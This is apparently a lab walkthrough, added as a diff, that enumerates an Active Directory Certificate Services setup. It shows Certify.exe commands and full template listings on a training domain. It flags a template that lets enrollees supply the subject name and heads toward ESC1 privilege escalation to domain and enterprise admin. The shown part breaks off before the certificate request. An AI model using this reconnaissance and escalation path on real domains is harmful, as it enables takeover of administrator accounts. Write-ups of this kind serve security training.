+    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+    Enrollment Agent Restrictions : None
+
+    Enabled Certificate Templates:
+        CA-Integration
+        HTTPSCertificates
+        SmartCardEnrollment-Agent
+        SmartCardEnrollment-Users
+        DirectoryEmailReplication
+        DomainControllerAuthentication
+        KerberosAuthentication
+        EFSRecovery
+        EFS
+        DomainController
+        WebServer
+        Machine
+        User
+        SubCA
+        Administrator
+
+Certify completed in 00:00:32.5851624
+```
+
+We can list all the templates using the following command. Going through the output we can find some 
+interesting templates
+
+* C:\AD\Tools> C:\AD\Tools\Certify.exe find
+```
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'
+
+[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'
+
+    Enterprise CA Name            : moneycorp-MCORP-DC-CA
+    DNS Hostname                  : mcorp-dc.moneycorp.local
+    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
+    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
+    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
+    Cert Start Date               : 11/26/2022 1:59:16 AM
+    Cert End Date                 : 11/26/2032 2:09:15 AM
+    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
+    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+    Enrollment Agent Restrictions : None
+
+[*] Available Certificates Templates :
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : User
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Domain Users            S-1-5-21-335606122-960912869-3279953914-513
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : EFS
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Encrypting File System
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Domain Users            S-1-5-21-335606122-960912869-3279953914-513
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : Administrator
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Microsoft Trust List Signing, Secure Email
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : EFSRecovery
+    Schema Version                        : 1
+    Validity Period                       : 5 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : File Recovery
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : Machine
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Server Authentication
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Domain Computers        S-1-5-21-335606122-960912869-3279953914-515
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : DomainController
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Server Authentication
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
+                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : WebServer
+    Schema Version                        : 1
+    Validity Period                       : 2 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : NONE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Server Authentication
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : SubCA
+    Schema Version                        : 1
+    Validity Period                       : 5 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : NONE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : <null>
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : DomainControllerAuthentication
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Server Authentication, Smart Card Logon
+    mspki-certificate-application-policy  : Client Authentication, Server Authentication, Smart Card Logon
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
+                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : DirectoryEmailReplication
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Directory Service Email Replication
+    mspki-certificate-application-policy  : Directory Service Email Replication
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
+                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : KerberosAuthentication
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DOMAIN_DNS, SUBJECT_ALT_REQUIRE_DNS
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
+    mspki-certificate-application-policy  : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
+                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : SmartCardEnrollment-Agent
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Certificate Request Agent
+    mspki-certificate-application-policy  : Certificate Request Agent
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : SmartCardEnrollment-Users
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 1
+    Application Policies                  : Certificate Request Agent
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : HTTPSCertificates
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : CA-Integration
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+Certify completed in 00:00:16.8362617
+```
+
+### Privilege Escalation to DA and EA using ESC1
+
+The template HTTPSCertificates looks interesting. Let's get some more information about it as it allows 
+requestor to supply subject name.
+
+* C:\AD\Tools> C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
+
+```
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'
+
+[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'
+
+    Enterprise CA Name            : moneycorp-MCORP-DC-CA
+    DNS Hostname                  : mcorp-dc.moneycorp.local
+    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
+    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
+    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
+    Cert Start Date               : 11/26/2022 1:59:16 AM
+    Cert End Date                 : 11/26/2032 2:09:15 AM
+    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
+    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+    Enrollment Agent Restrictions : None
+Enabled certificate templates where users can supply a SAN:
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : WebServer
+    Schema Version                        : 1
+    Validity Period                       : 2 years
+    Renewal Period                        : 6 weeks
